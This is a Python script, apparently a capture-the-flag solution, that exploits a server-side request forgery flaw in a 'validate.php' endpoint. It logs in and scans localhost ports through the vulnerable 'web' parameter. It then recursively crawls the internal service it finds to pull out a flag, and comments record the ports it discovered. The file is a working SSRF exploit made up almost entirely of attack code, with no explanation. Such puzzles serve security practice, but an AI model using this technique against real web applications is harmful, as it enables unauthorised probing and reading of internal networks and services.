import re
import time
from tqdm import tqdm
from init import login, domain, flag_pattern


validate_url = domain + "validate.php"
localhost = "http://localhost:"
default_resp = "Does this look correct to you?"
dir_pattern = r"href=&quot;[\w.-]+[/]*&"


def port_scan(start, end):
    ports = []
    session = login()
    print(f"Scanning Ports: {start} - {end} ...")
    pbar = tqdm(total=end + 1 - start, dynamic_ncols=True)
    rate = 30
    delay = 60 / rate
    last_req_time = time.monotonic() - delay
    for i in range(start, end + 1):
        params = {"web": f"{localhost}{i}"}
        resp = session.get(validate_url, params=params)
        if resp.text != default_resp:
            # print(f"\nPort:{i} Detected!")
            ports.append(i)
        elapsed_time = time.monotonic() - last_req_time
        if elapsed_time < delay:
            time.sleep(delay - elapsed_time)
        last_req_time = time.monotonic()
        pbar.update()
    pbar.close()
    session.close()
    if len(ports) == 0:
        print("Nothing special found.")
        return
    print(f"Suspicious ports: {ports}\n")
    return ports


def ssrf(port):
    session = login()
    print(f"SSRF on Port:{port} ...")
    params = {"web": f"{localhost}{port}"}
    resp = session.get(validate_url, params=params)

    print(f"Traversing {localhost}{port}/ ...")
    flag = traverse(session, port, resp)
    if flag is not None:
        print(f"Flag Found!\n{flag[0]}")
        print(f"Path: {localhost}{port}/{flag[1]}")
    else:
        print(f"No flag found.")
    session.close()


def traverse(session, port, response, path=""):
    if re.search(flag_pattern, response.text) is not None:
        return re.search(flag_pattern, response.text).group(0), path

    sub_dirs = re.findall(dir_pattern, response.text)
    for sub_dir in sub_dirs:
        sub_dir = sub_dir[11:-1]
        params = {"web": f"{localhost}{port}/{path}{sub_dir}"}
        resp = session.get(validate_url, params=params)
        res = traverse(session, port, resp, path + sub_dir)
        if res is not None:
            return res
    return None


# suspicious_ports = port_scan(1, 65565)

# 8873, 55665
# ssrf(8873)
